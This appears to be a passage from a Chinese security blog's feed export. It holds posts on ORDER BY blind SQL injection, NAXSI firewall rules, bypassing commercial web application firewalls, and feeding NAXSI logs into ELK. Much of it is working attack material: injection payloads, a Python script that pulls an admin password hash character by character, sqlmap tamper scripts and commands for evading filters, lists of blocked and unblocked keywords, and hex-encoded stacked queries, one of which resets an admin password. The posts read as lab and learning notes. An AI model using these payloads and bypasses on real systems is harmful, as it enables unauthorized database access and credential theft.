stingstring.maketrans(&#39;&#39;,&#39;&#39;)[33:127]&#39;!&quot;#$%&amp;\&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&#96;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mysql里面的字符串会默认按照上面这个数值的大小从小到大排列，看下图：</p><p><img src="/2017/11/23/order-by-blind/3.png"></p><p>比719大的字符串是<code>719;</code>，但是直接比较的话，mysql是会出错的。所以需要转换为16进制来比较。</p><p>总的来说就是拿16进制之后的字符串和admin的密码进行比较，比admin大的话，按照上面php的逻辑，在username为admin2的情况下</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin2&#39; union select 1,2,0x37313921 order by 3 desc#&amp;password&#x3D;1 &#x2F;&#x2F;返回结果admin2username&#x3D;admin2&#39; union select 1,2,0x3731393B order by 3 desc#&amp;password&#x3D;1 &#x2F;&#x2F;返回结果是2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外跑出来的都会是大写，看下面的语句:</p><pre class="line-numbers language-none"><code class="language-none">mysql&gt; select hex(&#39;c&#39;);+----------+| hex(&#39;c&#39;) |+----------+| 63       |+----------+1 row in set (0.00 sec)mysql&gt; select hex(&#39;C&#39;);+----------+| hex(&#39;C&#39;) |+----------+| 43       |+----------+1 row in set (0.00 sec)mysql&gt; select * from admin   where id&#x3D;2 union select 1,2,0x3731393563 order by 3 desc;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  2 | admin2   | 7195ca99696b5a896d067a0fa9dc61a6 ||  1 | 2        | 7195c                            |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from admin   where id&#x3D;2 union select 1,2,0x3731393543 order by 3 desc;+----+----------+----------------------------------+| id | username | password                         |+----+----------+----------------------------------+|  2 | admin2   | 7195ca99696b5a896d067a0fa9dc61a6 ||  1 | 2        | 7195C                            |+----+----------+----------------------------------+2 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在mysql里面大小写比较是一样的，即使实际上<code>c</code>的hex要比<code>C</code>大，在python脚本里面按照排列算的话，大写在前面。</p><del>貌似这里可以分辨大小写的，因为大小写中间有[\]^_`字符串，拿这个和他比。所以比较的时候要出现两次，第一次肯定是大写，如果再和上面的字符串hex比较，结果一样的话</del><p>上面实际测试，大小写和<code>^</code>比较结果一样，然后费了点时间自己下个脚本复现了下，最后的脚本(中间加的没用的东西是自己调试用的）:</p><pre class="line-numbers language-none"><code class="language-none">#&#x2F;usr&#x2F;bin&#x2F;env python# coding: utf-8import stringimport requestscest &#x3D; string.maketrans(&#39;&#39;, &#39;&#39;)[33:127]url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;c.php&quot;res &#x3D; &#39;&#39;i &#x3D; 0while 1:# payload &#x3D; res.strip(&#39;&#39;).encode(&#39;hex&#39;) + cest[i:i+1].encode(&#39;hex&#39;)payload &#x3D; (res + cest[i:i+1]).encode(&#39;hex&#39;)tmp &#x3D; &#123;&#39;username&#39;: &quot;admin&#39; union select 1,2,0x&quot;+ payload + &quot; order by 3 desc#&quot;, &quot;password&quot;: &#39;1&#39;&#125;req &#x3D; requests.post(url, data&#x3D;tmp, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;&#125; )c &#x3D; req.contentb &#x3D; req.content.find(&#39;admin&#39;)if req.content.find(&#39;admin&#39;) !&#x3D; -1:i +&#x3D; 1continueelse:res &#x3D; res + chr(ord(cest[i]) - 1)print resi &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，如果要实战中成功条件：</p><ul><li>确定union的列数</li><li>有二值判断的逻辑存在</li></ul><p>貌似没了。。。想到再补充吧。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>naxsi的规则</title>
      <link href="/2017/11/02/naxsi.html"/>
      <url>/2017/11/02/naxsi.html</url>
      
        <content type="html"><![CDATA[<ul><li>MainRule: 定义检测的规则和分数</li><li>BasicRule: 定义MainRule的白名单</li><li>CheckRule: 定义当分值达到阈值采取的动作</li></ul><h3 id="Checkrules"><a href="#Checkrules" class="headerlink" title="Checkrules"></a>Checkrules</h3><p>Checkrules指令有四种动作：</p><pre class="line-numbers language-none"><code class="language-none">LOG, BLOCK, DROP, ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>何时执行这四种动作？根据制定的得分(score)</p><p>####Basic Usage</p><pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$SQL &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果<code>$SQL</code>大于等于8，则<code>BLOCK</code>掉这个请求。（前提是打开防火墙的过滤模式，而不是learning模式）</p><p>####Other Usages<br>看看另外的一种用法，白名单和黑名单一起用的时候，比如有这样的规则:</p><pre class="line-numbers language-none"><code class="language-none">CheckRule &quot;$UWA &gt;&#x3D; 4&quot; DROP;CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>意思是任何请求只要匹配了<code>$UWA</code>规则，得分大于等于4，就block掉这个请求。<br>下面这个<code>$XSS</code>规则，只有开启了过滤（不是learning mode)，得分大于等于8就block</p><h2 id="Rules-BNF"><a href="#Rules-BNF" class="headerlink" title="Rules BNF"></a>Rules BNF</h2><h3 id="RUles"><a href="#RUles" class="headerlink" title="RUles"></a>RUles</h3><p>规则是用来匹配请求中的攻击。比如DROP掉任何包含字符串<code>zz</code>的GET或者POST请求:</p><pre class="line-numbers language-none"><code class="language-none">MainRule id:424242 &quot;str:zz&quot; &quot;mz:ARGS|BODY&quot; &quot;s:DROP&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Rules can be present at location level(BasicRule) or http level (MainRule)</p><ul><li>规则在写的时候，每个部分都必须要用双引号包含起来，除了id的那部分。</li></ul><h4 id="id-id-…"><a href="#id-id-…" class="headerlink" title="id(id:…)"></a>id(id:…)</h4><p><code>id:num</code> 在规则里面必须是独一无二的，最终会出现在NAXSI_FMT日志里面</p><p>id小于1000时是naxsi里面的保留规则id值。</p><h3 id="Match-Pattern"><a href="#Match-Pattern" class="headerlink" title="Match Pattern"></a>Match Pattern</h3><p>匹配的规则可以是正则，字符串或者调用一个库</p><ul><li><code>rx:foo|bar</code>: 匹配<code>foo</code>或者<code>bar</code>   (rx应该是regex，正则匹配的意思)</li><li><code>str:foo|bar</code>: 匹配<code>foo|bar</code></li><li><code>d:libinj_xss</code>: 如果libinjection返回结果是XSS，则匹配(&gt;=0.55r2版本)</li><li><code>d:libinj_sql</code>: 如果libinjection返回结果SQLI,则匹配 (&gt;=0.55r2版本)</li></ul><p>官方建议: 在可以使用字符串匹配的时候，尽量使用字符串，这样会快点。所有的字符串要小写<br>naxsi的匹配值大小写不敏感的。</p><h3 id="core-s"><a href="#core-s" class="headerlink" title="core(s:..)"></a>core(s:..)</h3><p>你可以创建一个计分的规则:<code>s:$FOOBAR:4</code>，符合这个规则的时候，<code>$FOOBAR</code>的值就增加4积分。<br>一条规则可以有多个计分规则:<code>s:$FOO:4,$BAR:8</code>，同理<code>$FOO</code>会增加4积分，<code>$BAR</code>增加8积分<br><code>s:</code>后面可以直接制定匹配的动作<code>DROP</code>或者<code>BLOCK</code></p><p>###MatchZone(mz:…)</p><p>mz是匹配区域，决定了规则匹配哪一部分:</p><pre class="line-numbers language-none"><code class="language-none">MainRule id:4242 str:z &quot;mz:$ARGS_VAR:X|BODY&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在GET请求的参数X里面或者BODY里面的参数，搜索字符串z</p><pre class="line-numbers language-none"><code class="language-none">MainRule id:4342 str:z &quot;mz:$ARGS_VAR:X|BODY|$URL_X:^&#x2F;foo&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在GET请求的X参数里面或者BODY里面或者URL里以/foo开头的路径搜索是否有z字符串<br>从0.55rc0版本里面，对于不知道的content-type,可以使用RAW_BODY来匹配:</p><pre class="line-numbers language-none"><code class="language-none">MainRule id:4241 s:DROP str:z mz:RAQ_BODY;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只有在以下情况才会匹配RAW_BODy:</p><ul><li>Content-type是未知的，表示naxsi不知道如何处理</li><li><code>id 11</code>（内置的一个规则，对于所有未知类型，都是白名单处理）</li></ul><p>##M atch Zones</p><h3 id="Global-Zones"><a href="#Global-Zones" class="headerlink" title="Global Zones"></a>Global Zones</h3><p><a href="https://github.com/nbs-system/naxsi/wiki/matchzones-bnf">https://github.com/nbs-system/naxsi/wiki/matchzones-bnf</a><br>有4个主要的匹配区域: URL, ARGS, HEADERS, BODY</p><ul><li><code>ARGS</code>: GET参数</li><li><code>HEADERS</code>: HTTP头</li><li><code>BODY</code>: POST参数(and RAW_BODY)</li><li><code>URL</code>: URL（before ‘?’)</li></ul><p>或者具体点:</p><ul><li><code>$ARGS_VAR:string</code>:具体的GET参数</li><li><code>HEADERS_VAR:string</code>:具体的HTTP头</li><li><code>$BODY_VAR:string</code>:具体的POST参数</li></ul><p>或者用正则来表示:</p><ul><li><code>$HEADERS_VAR_X:regex</code>: 正则匹配具体的HTTP头(&gt;=0.52)</li><li><code>$ARGS_VAR_X:regex</code>: 正则匹配具体的GET参数</li><li><code>$BODY_VAR_X:regex</code>: 正则匹配具体的POST参数</li></ul><p>具体点:</p><ul><li><code>FILE_EXT</code>: 文件名</li></ul>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass firewall</title>
      <link href="/2017/10/30/bypass-sql-firewall.html"/>
      <url>/2017/10/30/bypass-sql-firewall.html</url>
      
        <content type="html"><![CDATA[<p>狗的绕过比较简单，还是写一下：</p><p><a href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p><p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &#39;doc&#x2F;COPYING&#39; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    &quot;&quot;&quot;    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;    &quot;&quot;&quot;    retVal &#x3D; payload    if payload:        retVal &#x3D; &quot;&quot;        quote, doublequote, firstspace &#x3D; False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace &#x3D; True                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;                    continue            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:                quote &#x3D; not quote            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:                doublequote &#x3D; not doublequote            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;                continue            retVal +&#x3D; payload[i]    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)See the file &#39;LICENSE&#39; for copying permission&quot;&quot;&quot;import osimport refrom lib.core.common import singleTimeWarnMessagefrom lib.core.data import kbfrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITYfrom lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS__priority__ &#x3D; PRIORITY.HIGHERdef dependencies():    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))def tamper(payload, **kwargs):    &quot;&quot;&quot;    Adds versioned MySQL comment before each keyword    Requirement:        * MySQL &lt; 5.1    Tested against:        * MySQL 4.0.18, 5.0.22    Notes:        * Useful to bypass several web application firewalls when the          back-end database management system is MySQL        * Used during the ModSecurity SQL injection challenge,          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;    &quot;&quot;&quot;    def process(match):        word &#x3D; match.group(&#39;word&#39;)        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)        else:            return match.group()    retVal &#x3D; payload    if payload:        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p></blockquote><p>比如mysql版本是5.5.53:</p><blockquote><p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p></blockquote><p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p><p>由于主机卫士会拦截cast，修改sqlmap的配置文件:<code>sqlmap/xml/queries.xml</code>,先备份，然后修改第6行的内容<code>&lt;cast query=&quot;CAST(%s AS CHAR)&quot;/&gt;</code>，修改为<code>&lt;cast query=&quot;%s&quot;/&gt;</code>。</p><p>这个时候，在注入的时候需要指定<code>--technique</code>为E或者U，盲注在这种情况下是不行的，因为会拦截ord函数。</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;192.168.141.200&#x2F;sqli-labs&#x2F;Less-1&#x2F;index.php\?id\&#x3D;1 --tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>盲注bypass的尝试:</p><ul><li>在<code>sqlmap/txt/keywords.txt</code>里面添加了<code>SLEEP</code>，就是在注入的时候，添加SLEEP为关键词注释掉</li></ul><p>因为在注入的时候同样使用了ord函数。<br>盲注的函数，</p><pre class="line-numbers language-none"><code class="language-none">pow() 计算平方的，对于字母来说貌似结果都一样 passpi()exp() 以e为底的指函数ceil() 向上取整sqrt() 给定值的平方根floor() 向下取整ceiling() 向上取整<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>被拦截的函数，</p><pre class="line-numbers language-none"><code class="language-none">ascii()hex()unhex()ord()char()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考<a href="http://www.cnblogs.com/xiaozi/p/7275134.html">http://www.cnblogs.com/xiaozi/p/7275134.html</a>这篇文章里面的替换:</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python&quot;&quot;&quot;write by Aaron&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ &#x3D; PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    &quot;&quot;&quot;    Replaces keywords    &gt;&gt;&gt; tamper(&#39;UNION SELECT id FROM users&#39;)    &#39;union%0a&#x2F;*!12345select*&#x2F;id%0a&#x2F;*!12345from*&#x2F;users&#39;    &quot;&quot;&quot;    if payload:        payload&#x3D;payload.replace(&quot; ALL SELECT &quot;,&quot;%0a&#x2F;*!12345select*&#x2F;&quot;)        payload&#x3D;payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a&#x2F;*!12345select*&#x2F;&quot;)        payload&#x3D;payload.replace(&quot; FROM &quot;,&quot;%0a&#x2F;*!12345from*&#x2F;&quot;)        payload&#x3D;payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;)        payload&#x3D;payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;)        payload&#x3D;payload.replace(&quot;CAST(&quot;,&quot;&#x2F;*!12345CASt(*&#x2F;&quot;)        payload&#x3D;payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;)                    return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只要把ORD函数給注释包含就可以。</p><p>网站卫士和主机卫士不同，貌似网站卫士更严格。测试下如何绕过。</p><p>主机卫士不是最新版，fucck</p><p>###预编译注入<br>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;<br>prepare a from ‘select user()’;execute a;</p><p>一般情况下PDO只会返回第一条SQL语句的结果，一般执行一个update语句，将需要的数据更新到某个可见的字段中，或者使用sleep盲注。</p><p>set(@x=757064617465207573657220736574207077643D31313120776865726520757365726E616D653D2761646D696E27);prepare(a)from(@x);execute(a)</p><p>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;<br>prepare a from ‘select user()’;execute a;</p><p>union select 拦截<br>select union 不拦截<br>select from 拦截<br>select all 不拦截<br>updatexml select 拦截</p><p>注释:</p><pre class="line-numbers language-none"><code class="language-none">#-- -- ---+&#x2F;&#x2F;&#x2F;**&#x2F;&#x2F;*abcd*&#x2F;;%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空白字符：</p><p>09 0A 0B 0C 0D A0 20</p><p>字符串连接函数:<br>concat<br>concat_ws</p><p>除去GET以外，其他过滤最弱。</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;1|@pwd:&#x3D;(select user from users where id&#x3D;4)&#x2F;*ddd*&#x2F;union&#x2F;*ddd*&#x2F;select null,@pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">union select 拦截select from 拦截updatexml select 拦截select all from 拦截select distinct from 拦截select distinctrow from 拦截select all union 不拦截select all 不拦截select union 不拦截 union from 不拦截<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NAXSI和ELK</title>
      <link href="/2017/10/25/naxsi-elk.html"/>
      <url>/2017/10/25/naxsi-elk.html</url>
      
        <content type="html"><![CDATA[<p>NAXSI防火墙介绍: <a href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p><p>过滤XSS，SQL注入，文件上传，文件遍历</p><p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p><pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p><pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir patternlogstash&gt; cd patternlogstash&gt; vim naxsiDA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;LEVEL (\w+)NUM1 \d+(?:#0: \*)NUM2 \d+EXLOG NAXSI_EXLOGFMT NAXSI_FMTID1 (\d+)ZONE \w+VAR1  (.*)CONTENT (.*)T3 \w+T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;HOST (.*)NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;FMT_R 